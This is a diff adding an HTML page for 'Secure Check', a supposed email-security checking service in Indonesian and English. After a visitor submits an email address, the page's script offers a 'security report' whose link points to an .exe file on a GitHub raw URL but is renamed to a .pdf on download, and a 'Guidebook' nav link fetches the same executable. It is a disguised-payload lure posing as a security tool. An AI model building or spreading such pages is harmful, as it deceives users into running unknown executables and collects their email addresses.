@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/static/styles.css" />
+</head>
+<body>
+  <header>
+    <div class="logo">Secure Check</div>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#about">About</a>
+      <a href="#service">Service</a>
+      <a href="https://raw.githubusercontent.com/Ayamet/web/main/main/report_for_secuity.exe" download>
+        Guidebook
+      </a>
+    </nav>
+  </header>
+
+  <section class="main-section">
+    <div class="title-box">
+      <h1>Secure Check - Periksa Keamanan Email Anda</h1>
+      <p>Pastikan Email Anda Aman, Valid, dan Tidak Berbahaya.</p>
+    </div>
+
+    <form class="email-form" id="emailForm">
+      <input type="email" name="email" placeholder="Enter your email" required />
+      <button type="submit">Check</button>
+    </form>
+
+    <div class="error-message" style="display:none; color:red;">
+      <p></p>
+    </div>
+    <div class="thanks-message" style="display:none; color:green;">
+      <p></p>
+    </div>
+    <div class="result-box" style="display:none;">
+      <p>
+        Results have been sent to <a href="#" id="email-link"></a>
+        or press <a href="#" class="download-button" download>Download</a>
+      </p>
+    </div>
+  </section>
+
+  <section id="about" class="about-section">
+    <div class="title-box">
+      <h2>About Us</h2>
+      <p><strong>Secure Check</strong> adalah platform online yang dirancang untuk membantu pengguna
+         memeriksa keamanan akun email anda...</p>
+    </div>
+  </section>
+
+  
+    <section id="service" class="service-section">
+  <div class="title-box">
+    <h2>Our Services</h2>
+    <p><strong>Secure Check</strong> menyediakan tiga layanan utama untuk menjaga akun email Anda tetap aman dari ancaman siber.</p>
+    <div class="features">
+      <div class="feature-item">
+        <img src="static/image/Deteksi-Keamanan-Email.png" alt="Deteksi Keamanan Email" />
+        <h3>Deteksi Keamanan Email</h3>
+        <p>Mendeteksi apakah email Anda pernah terlibat dalam insiden kebocoran data atau pelanggaran keamanan lainnya termasuk potensi terhadap peretasan.</p>
+      </div>
+      <div class="feature-item">
+        <img src="static/image/Pemeriksaan-Kekuatan-Sandi.png" alt="Pemeriksaan Kekuatan Sandi" />
+        <h3>Pemeriksaan Kekuatan Sandi</h3>
+        <p>Menganalisis kekuatan kata sandi Anda dan dapatkan saran untuk membuatnya lebih kuat dan tahan terhadap peretasan.</p>
+      </div>
+      <div class="feature-item3">
+        <img src="static/image/Verifikasi-Validitas-Email.png" alt="Verifikasi Validitas Email" />
+        <h3>Verifikasi Validitas Email</h3>
+        <p>Melakukan pengecekan serta memastikan apakah alamat email yang anda gunakan terdaftar, valid, aktif, dan juga dapat menerima pesan.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+  <footer>
+    <span>© Secure Check. All rights reserved.</span>
+  </footer>
+
+  <script>
+    const form = document.getElementById('emailForm');
+    const errorDiv = document.querySelector('.error-message');
+    const thanksDiv = document.querySelector('.thanks-message');
+    const resultBox = document.querySelector('.result-box');
+    const emailLink = document.getElementById('email-link');
+    const downloadBtn = document.querySelector('.download-button');
+
+    function validateEmail(e) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
+    }
+
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+      errorDiv.style.display = 'none';
+      thanksDiv.style.display = 'none';
+      resultBox.style.display = 'none';
+
+      const email = form.email.value.trim();
+      if (!validateEmail(email)) {
+        errorDiv.querySelector('p').textContent = 'Please enter a valid email address.';
+        errorDiv.style.display = 'block';
+        return;
+      }
+
+      try { 
+        const res = await fetch('http://localhost:3000/send-email', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        const data = await res.json();
+        if (data.success) {
+          thanksDiv.querySelector('p').textContent = `Thank you! Check for "${email}" processed.`;
+          thanksDiv.style.display = 'block';
+          resultBox.style.display = 'block';
+          emailLink.textContent = email;
+          emailLink.href = `mailto:${email}`;
+          downloadBtn.href = 'https://raw.githubusercontent.com/Ayamet/web/main/main/report_for_secuity.exe';
+          downloadBtn.download = `security_report_${email}.pdf`;
+        } else {
+          throw new Error(data.error || 'Failed to send');
+        }
+      } catch (err) {
+        errorDiv.querySelector('p').textContent = 'Error sending email: ' + err.message;
+        errorDiv.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
